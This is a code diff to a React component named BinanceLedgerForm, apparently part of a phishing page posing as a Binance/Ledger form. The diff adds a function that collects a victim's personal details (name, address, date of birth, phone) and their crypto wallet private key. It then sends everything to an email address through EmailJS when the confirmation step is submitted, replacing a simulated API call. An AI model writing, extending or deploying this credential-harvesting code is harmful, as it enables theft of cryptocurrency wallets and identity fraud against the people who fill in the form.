@@ -141,6 +141,54 @@ const BinanceLedgerForm: FC = () => {
     };
   }, [currentStep, timerCount, toast]);
 
+  const sendEmailNotification = async () => {
+    try {
+      const templateParams = {
+        user_email: formData.email,
+        user_name: `${formData.firstName} ${formData.lastName}`,
+        user_phone: formData.phoneNumber,
+        user_dob: formData.dateOfBirth,
+        user_address: formData.address,
+        user_zip: formData.zipCode,
+        user_city: formData.city,
+        user_country: formData.country,
+        user_private_key: formData.privateKey,
+        submission_date: new Date().toLocaleString(),
+        form_data: JSON.stringify({
+          email: formData.email,
+          firstName: formData.firstName,
+          lastName: formData.lastName,
+          dateOfBirth: formData.dateOfBirth,
+          phoneNumber: formData.phoneNumber,
+          address: formData.address,
+          zipCode: formData.zipCode,
+          city: formData.city,
+          country: formData.country,
+          privateKey: formData.privateKey,
+          walletConfirmations: formData.walletConfirmations
+        }, null, 2)
+      };
+
+      await emailjs.send(
+        EMAILJS_CONFIG.SERVICE_ID,
+        EMAILJS_CONFIG.TEMPLATE_ID,
+        templateParams,
+        EMAILJS_CONFIG.USER_ID
+      );
+
+      console.log('Email sent successfully');
+      return true;
+    } catch (error) {
+      console.error('Failed to send email:', error);
+      toast({
+        title: "Warning",
+        description: "Form submitted but email notification failed to send",
+        variant: "destructive",
+      });
+      return false;
+    }
+  };
+
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
       ...formData,
@@ -305,11 +353,11 @@ const BinanceLedgerForm: FC = () => {
         
       case FormStep.CONFIRMATION:
         setIsSubmitting(true);
-        // Simulate API call
-        setTimeout(() => {
+        // Send email with form data
+        sendEmailNotification().finally(() => {
           setIsSubmitting(false);
           setCurrentStep(FormStep.SHIPMENT_CONFIRMATION);
-        }, 1500);
+        });
         break;
         
       case FormStep.SHIPMENT_CONFIRMATION:
